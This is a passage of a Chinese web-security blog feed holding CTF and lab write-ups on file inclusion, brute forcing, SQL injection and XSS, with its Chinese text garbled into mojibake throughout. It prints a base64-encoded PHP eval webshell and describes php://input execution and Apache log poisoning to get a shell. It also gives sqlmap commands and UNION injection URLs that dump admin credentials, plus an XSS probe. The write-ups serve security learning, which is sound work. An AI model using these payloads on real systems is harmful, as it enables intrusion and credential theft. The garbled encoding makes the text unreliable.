</p><p>PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk/Pg==</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%889.17.50.png" style="zoom:45%;"><p>æˆåŠŸè·å–ç½‘é¡µæºä»£ç ã€‚</p></blockquote><h3 id="3-4-3-PHPå°è£…åè®®-â€“ï¼ˆphp-inputï¼‰-æ‰§è¡ŒPHPå‘½ä»¤-ä»£ç "><a href="#3-4-3-PHPå°è£…åè®®-â€“ï¼ˆphp-inputï¼‰-æ‰§è¡ŒPHPå‘½ä»¤-ä»£ç " class="headerlink" title="3.4.3 PHPå°è£…åè®®- â€“ï¼ˆphp://inputï¼‰ æ‰§è¡ŒPHPå‘½ä»¤/ä»£ç "></a>3.4.3 PHPå°è£…åè®®- â€“ï¼ˆphp://inputï¼‰ æ‰§è¡ŒPHPå‘½ä»¤/ä»£ç </h3><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨PHPçš„å°è£…åè®®æ¥æ‰§è¡ŒPHPå‘½ä»¤ã€‚</p><blockquote><h4 id="EXï¼šåˆ©ç”¨PHPå°è£…åè®®æ‰§è¡ŒPHPå‘½ä»¤"><a href="#EXï¼šåˆ©ç”¨PHPå°è£…åè®®æ‰§è¡ŒPHPå‘½ä»¤" class="headerlink" title="EXï¼šåˆ©ç”¨PHPå°è£…åè®®æ‰§è¡ŒPHPå‘½ä»¤"></a>EXï¼šåˆ©ç”¨PHPå°è£…åè®®æ‰§è¡ŒPHPå‘½ä»¤</h4><p>1ã€æ‹·è´æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„é“¾æ¥ï¼Œåœ¨repeateræ¨¡å—ä¸­ç²˜è´´URLä½œä¸ºè¯·æ±‚ã€‚</p><p>2ã€ç”¨php://inputæ‰§è¡Œå‘½ä»¤/ä»£ç </p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%889.24.14.png" style="zoom:75%;"><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%889.24.55.png" style="zoom:75%;"></blockquote><p>æœ‰ä¸¤ç§ç”¨é€”ï¼š1ã€CTF 2ã€æŒä¹…æ§åˆ¶çš„ä¸€ä¸ªPHPåé—¨ï¼ˆä¸ä¼šåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸­ç•™ä¸‹åé—¨ï¼‰ã€‚</p><h1 id="å››ã€è¡¥å……å’Œæ‰©å±•"><a href="#å››ã€è¡¥å……å’Œæ‰©å±•" class="headerlink" title="å››ã€è¡¥å……å’Œæ‰©å±•"></a>å››ã€è¡¥å……å’Œæ‰©å±•</h1><p>âš ï¸ï¼šå·²çŸ¥ä¸€ä¸ªç½‘ç«™å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ²¡æœ‰æ–‡ä»¶ä¸Šä¼ çš„APIï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿ</p><h2 id="4-1-Apacheæ—¥å¿—æ”»å‡»getshell"><a href="#4-1-Apacheæ—¥å¿—æ”»å‡»getshell" class="headerlink" title="4.1 Apacheæ—¥å¿—æ”»å‡»getshell"></a>4.1 Apacheæ—¥å¿—æ”»å‡»getshell</h2><p>1ã€GETè¯·æ±‚ ä¸­åŒ…å«ä¸€å¥è¯æœ¨é©¬</p><p>2ã€æŸ¥çœ‹æ—¥å¿—è®°å½•ï¼ˆéœ€è¦çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ï¼šå¸¸è¯†æˆ–çˆ†ç ´ï¼‰</p><p>3ã€åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ—¥å¿—æ–‡ä»¶</p><p>4ã€åˆ©ç”¨èšå‰‘è¿æ¥getshell</p><h2 id="4-2-åŒ…å«sessionæ–‡ä»¶ï¼Œé€ æˆSessionIdæ³„æ¼"><a href="#4-2-åŒ…å«sessionæ–‡ä»¶ï¼Œé€ æˆSessionIdæ³„æ¼" class="headerlink" title="4.2 åŒ…å«sessionæ–‡ä»¶ï¼Œé€ æˆSessionIdæ³„æ¼"></a>4.2 åŒ…å«sessionæ–‡ä»¶ï¼Œé€ æˆSessionIdæ³„æ¼</h2><p>éœ€è¦çŸ¥é“sessionæ–‡ä»¶åœ¨å“ªé‡Œã€‚</p><h2 id="4-3-ä»£ç å®¡è®¡å‘æ˜æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#4-3-ä»£ç å®¡è®¡å‘æ˜æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="4.3 ä»£ç å®¡è®¡å‘æ˜æ–‡ä»¶åŒ…å«æ¼æ´"></a>4.3 ä»£ç å®¡è®¡å‘æ˜æ–‡ä»¶åŒ…å«æ¼æ´</h2><p>metinfo5.0.4 æ–‡ä»¶åŒ…å«æ¼æ´ä»£ç å®¡è®¡</p><p>Seayæºä»£ç å®¡è®¡ç³»ç»Ÿã€‚<code>ã€https://github.com/f1tz/cnseayã€‘</code></p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-13%20%E4%B8%8B%E5%8D%882.59.22.png" style="zoom:75%;"><p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-13%20%E4%B8%8B%E5%8D%883.00.39.png" style="zoom:55%;"> <img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-13%20%E4%B8%8B%E5%8D%887.04.50.png" style="zoom:65%;"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ–‡ä»¶åŒ…å«æ¼æ´æ˜¯æŒ‡åº”ç”¨ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡ç”¨æˆ·è¾“å…¥æˆ–å¤–éƒ¨æ•°æ®åŠ¨æ€åŠ è½½æ–‡ä»¶æ—¶ï¼Œæœªèƒ½å¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤å’ŒéªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿå°†æ¶æ„æ–‡ä»¶è·¯å¾„æˆ–URLæ³¨å…¥åˆ°æ–‡ä»¶åŠ è½½å‡½æ•°ä¸­ï¼Œä»è€Œä½¿åº”ç”¨ç¨‹åºåŒ…å«å¹¶æ‰§è¡Œäº†æ¶æ„æ–‡ä»¶çš„å†…å®¹ã€‚è¿™ç§æ¼æ´å¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ã€ç¯¡æ”¹åº”ç”¨ç¨‹åºé€»è¾‘ç­‰ï¼Œå¯¹ç³»ç»Ÿçš„å®‰å…¨æ€§å’Œç¨³å®šæ€§æ„æˆä¸¥é‡å¨èƒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-(BUU LFI COURSE1)</title>
      <link href="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/"/>
      <url>/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/%E6%88%AA%E5%B1%8F2025-02-11%2019.35.37.png" style="zoom:50%;"><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/%E6%88%AA%E5%B1%8F2024-11-15%2017.49.27.png" alt="æˆªå±2024-11-15 17.49.27" style="zoom:50%;"><h1 id="äºŒã€è€ƒç‚¹"><a href="#äºŒã€è€ƒç‚¹" class="headerlink" title="äºŒã€è€ƒç‚¹"></a>äºŒã€è€ƒç‚¹</h1><p>åŸºç¡€æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><h1 id="ä¸‰ã€è§£é¢˜"><a href="#ä¸‰ã€è§£é¢˜" class="headerlink" title="ä¸‰ã€è§£é¢˜"></a>ä¸‰ã€è§£é¢˜</h1><ul><li>payload</li></ul><pre class="line-numbers language-none"><code class="language-none">?file=/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>è§£é¢˜</li></ul><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/%E6%88%AA%E5%B1%8F2024-11-15%2017.50.17.png" alt="æˆªå±2024-11-15 17.50.17"></p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/%E6%88%AA%E5%B1%8F2024-11-15%2017.51.02.png" alt="æˆªå±2024-11-15 17.51.02" style="zoom:50%;"><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-none"><code class="language-none">flag{1d8059c2-58c4-4257-9afa-d268d7aa2698}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
            <tag> æ–‡ä»¶åŒ…å«æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-(BUU BRUTE 1)</title>
      <link href="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/"/>
      <url>/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.09.35.png" alt="æˆªå±2024-11-18 18.09.35" style="zoom:50%;"><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.09.57.png" alt="æˆªå±2024-11-18 18.09.57" style="zoom:50%;"><h2 id="äºŒã€è€ƒç‚¹"><a href="#äºŒã€è€ƒç‚¹" class="headerlink" title="äºŒã€è€ƒç‚¹"></a>äºŒã€è€ƒç‚¹</h2><p>BurpSuite-intruderçˆ†ç ´æ¨¡å—çš„ç®€å•ä½¿ç”¨ã€‚</p><h3 id="ä¸‰ã€è§£é¢˜"><a href="#ä¸‰ã€è§£é¢˜" class="headerlink" title="ä¸‰ã€è§£é¢˜"></a>ä¸‰ã€è§£é¢˜</h3><p>é€šè¿‡æ‰‹åŠ¨æµ‹è¯•ï¼Œå‘ç°ç”¨æˆ·åä¸ºadminã€å¯†ç ä¸º4ä½æ•°å­—ï¼Œè¿›ä¸€æ­¥ç¼©å°çˆ†ç ´èŒƒå›´ã€‚</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.31.16.png" style="zoom:50%;"><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.31.39.png" style="zoom:50%;"><p>é…ç½®BP intruderæ¨¡å—ã€‚</p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.11.11.png" alt="æˆªå±2024-11-18 18.11.11"></p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.23.03.png" alt="æˆªå±2024-11-18 18.23.03" style="zoom:40%;"><p>æˆåŠŸçˆ†ç ´å‡ºflag</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.25.08.png" alt="æˆªå±2024-11-18 18.25.08" style="zoom:50%;"><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-none"><code class="language-none">flag{d6bcba07-41d6-4585-894c-d766e3f7646a}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
            <tag> æš´åŠ›ç ´è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-(BUU SQL COURSE 1)</title>
      <link href="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/"/>
      <url>/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.20.41.png" style="zoom:50%;"><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.18.51.png" alt="æˆªå±2024-11-22 17.18.51"></p><h1 id="äºŒã€è€ƒç‚¹"><a href="#äºŒã€è€ƒç‚¹" class="headerlink" title="äºŒã€è€ƒç‚¹"></a>äºŒã€è€ƒç‚¹</h1><p>åŸºç¡€çš„sqlæ³¨å…¥ã€‚</p><h1 id="ä¸‰ã€è§£é¢˜"><a href="#ä¸‰ã€è§£é¢˜" class="headerlink" title="ä¸‰ã€è§£é¢˜"></a>ä¸‰ã€è§£é¢˜</h1><p>å¯¹å…³é”®çš„æ•°æ®åº“è¯·æ±‚æŠ“åŒ…ã€‚</p><p>å¯¹å…³é”®çš„æ•°æ®åº“è¯·æ±‚æŠ“åŒ…ã€‚</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.19.59-2267207.png" alt="æˆªå±2024-11-22 17.19.59" style="zoom:50%;"><p>æ ¹æ®æŠ“åŒ…å†…å®¹æ‹¼æ¥å®Œæ•´çš„è¯·æ±‚urlï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php?id<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.21.59.png" alt="æˆªå±2024-11-22 17.21.59"></p><h2 id="3-1-sqlmap"><a href="#3-1-sqlmap" class="headerlink" title="3.1 sqlmap"></a>3.1 sqlmap</h2><ul><li>åˆ—å‡ºæ•°æ®åº“</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php<span class="token punctuation">\</span>?id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.25.35-2267540.png" alt="æˆªå±2024-11-22 17.25.35" style="zoom:50%;"><ul><li>æŒ‡å®šæ•°æ®åº“åï¼Œåˆ—å‡ºè¡¨å</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php<span class="token punctuation">\</span>?id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> news <span class="token parameter variable">--tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.27.01-2267625.png" alt="æˆªå±2024-11-22 17.27.01" style="zoom:50%;"><ul><li>æŒ‡å®šè¡¨åï¼Œåˆ—å‡ºå­—æ®µå</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php<span class="token punctuation">\</span>?id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> news <span class="token parameter variable">-T</span> admin <span class="token parameter variable">--columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.27.49-2267673.png" alt="æˆªå±2024-11-22 17.27.49" style="zoom:50%;"><ul><li>åˆ—å‡ºæ•°æ®è¡¨çš„æ•°æ®</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php<span class="token punctuation">\</span>?id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> news <span class="token parameter variable">-T</span> admin <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.22.50.png" style="zoom:80%;"><p>838862827662e69881102efeb9b35cbd å¯èƒ½æ˜¯hashå€¼ï¼Œä½†ä¹Ÿå¯èƒ½å°±æ˜¯åŸå§‹çš„å¯†ç ã€‚</p><p>ç™»å½•ï¼Œè·å¾—flagã€‚</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.30.33.png" alt="æˆªå±2024-11-22 17.30.33" style="zoom:50%;"><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.31.00-2267865.png" alt="æˆªå±2024-11-22 17.31.00" style="zoom:50%;"><h2 id="3-2-æ‰‹å·¥æ³¨å…¥"><a href="#3-2-æ‰‹å·¥æ³¨å…¥" class="headerlink" title="3.2 æ‰‹å·¥æ³¨å…¥"></a>3.2 æ‰‹å·¥æ³¨å…¥</h2><ul><li>æ³¨å…¥ç‚¹åˆ¤æ–­ï¼šï¼ˆæ³¨å…¥ç‚¹çš„ä½ç½®å’Œæ³¨å…¥çš„æ‰‹æ³•ï¼‰</li></ul><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.32.20.png" alt="æˆªå±2024-11-22 17.32.00"></p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.32.49.png" alt="æˆªå±2024-11-22 17.32.49"></p><p>å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œä¸”å­˜åœ¨å¸ƒå°”çŠ¶æ€ï¼Œå¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚</p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.35.04.png" alt="æˆªå±2024-11-22 17.35.04"></p><p>å­˜åœ¨æ—¶å»¶çŠ¶æ€ï¼Œå¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨ã€‚</p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.36.38.png" alt="æˆªå±2024-11-22 17.36.38"></p><p>æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œå¯èƒ½æ— æ³•è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.37.28.png" alt="æˆªå±2024-11-22 17.37.28" style="zoom:50%;"><p>å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„æƒ…å†µä¸‹ï¼Œ å­˜åœ¨å›æ˜¾ï¼Œæœ‰å…ˆè€ƒè™‘è”åˆæŸ¥è¯¢æ³¨å…¥ã€‚</p><ul><li>åˆ¤æ–­å­—æ®µä¸ªæ•°</li></ul><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.39.18.png" alt="æˆªå±2024-11-22 17.39.18"></p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.39.43.png" alt="æˆªå±2024-11-22 17.39.43"></p><p>å­—æ®µä¸ªæ•°ä¸º2.</p><ul><li>å›æ˜¾ä½ç½®</li></ul><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.40.30.png" alt="æˆªå±2024-11-22 17.40.30"></p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.40.58.png" alt="æˆªå±2024-11-22 17.40.58"></p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.25.04.png" style="zoom:50%;"><p>æ•°æ®åº“ä¸ºmysqlã€‚</p><ul><li>è·å–è¡¨å</li></ul><pre class="line-numbers language-none"><code class="language-none">http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php?id=-1%20union%20select%20table_name,version()%20from%20information_schema.tables%20where%20table_schema=database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.43.46.png" alt="æˆªå±2024-11-22 17.43.46"></p><p>è¡¨åï¼šadmin</p><ul><li>è·å–å­—æ®µå</li></ul><pre class="line-numbers language-none"><code class="language-none">db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php?id=-1 union select group_concat(column_name),version() from information_schema.columns where table_schema=database() and table_name='admin' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.47.39.png" alt="æˆªå±2024-11-22 17.47.39"></p><ul><li>è·å–å€¼</li></ul><pre class="line-numbers language-none"><code class="language-none">http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php?id=-1%20union%20select%20group_concat(username,password),version()%20from%20admin--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.49.07-2268952.png" alt="æˆªå±2024-11-22 17.49.07"></p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.49.54.png" alt="æˆªå±2024-11-22 17.49.54"></p><p>å¯†ç ï¼š838862827662e69881102efeb9b35cbd</p><ul><li>ç™»å½•è·å–flag</li></ul><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.50.38-2269044.png" alt="æˆªå±2024-11-22 17.50.38" style="zoom: 33%;"><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-none"><code class="language-none">flag{8d21ee6f-7b64-4895-961f-d120a205302c}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-xss-labs</title>
      <link href="/2025/02/06/ctf-shi-zhan/web-xss-labs/"/>
      <url>/2025/02/06/ctf-shi-zhan/web-xss-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="é›¶ã€é¶åœºéƒ¨ç½²"><a href="#é›¶ã€é¶åœºéƒ¨ç½²" class="headerlink" title="é›¶ã€é¶åœºéƒ¨ç½²"></a>é›¶ã€é¶åœºéƒ¨ç½²</h1><p>åœ¨çº¿é¶åœºï¼š<a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><p>ç”¨phpstudyæ­å»ºç½‘ç«™ï¼Œä¸‹è½½xss-labsé¡¹ç›®ä¹‹åï¼Œæ”¾åœ¨wwwç›®å½•ä¸‹ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.16.09.png" style="zoom:50%;"><p>è®¿é—®æµ‹è¯•ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.17.23.png" style="zoom:30%;"><h1 id="ä¸€ã€level-01ï¼ˆåŸºç¡€åå°„å‹xssï¼‰"><a href="#ä¸€ã€level-01ï¼ˆåŸºç¡€åå°„å‹xssï¼‰" class="headerlink" title="ä¸€ã€level-01ï¼ˆåŸºç¡€åå°„å‹xssï¼‰"></a>ä¸€ã€level-01ï¼ˆåŸºç¡€åå°„å‹xssï¼‰</h1><h2 id="2-1-é¢˜é¢"><a href="#2-1-é¢˜é¢" class="headerlink" title="2.1 é¢˜é¢"></a>2.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.20.28.png" style="zoom:30%;"><h2 id="2-2-è§£é¢˜"><a href="#2-2-è§£é¢˜" class="headerlink" title="2.2 è§£é¢˜"></a>2.2 è§£é¢˜</h2><p>getè¯·æ±‚æäº¤äº†ä¸€ä¸ªnameå‚æ•°ï¼Œå€¼ä¸ºtestï¼Œé¡µé¢â€œæ¬¢è¿ç”¨æˆ·â€åä¼šå›æ˜¾nameçš„å€¼ã€‚</p><p>è°ƒæ•´nameå‚æ•°çš„å€¼ï¼Œç¡®è®¤å›æ˜¾å†…å®¹å’Œä½ç½®ï¼šname=12345678ï¼Œ</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.22.27.png" alt="æˆªå±2025-02-06 14.22.27" style="zoom:40%;"><p>å°è¯•xss pocï¼š<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.23.53.png" style="zoom:50%;"><p>é€šè¿‡âœ…ã€‚</p><h2 id="2-3-ä»£ç å®¡è®¡"><a href="#2-3-ä»£ç å®¡è®¡" class="headerlink" title="2.3 ä»£ç å®¡è®¡"></a>2.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--STATUS OK--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">window<span 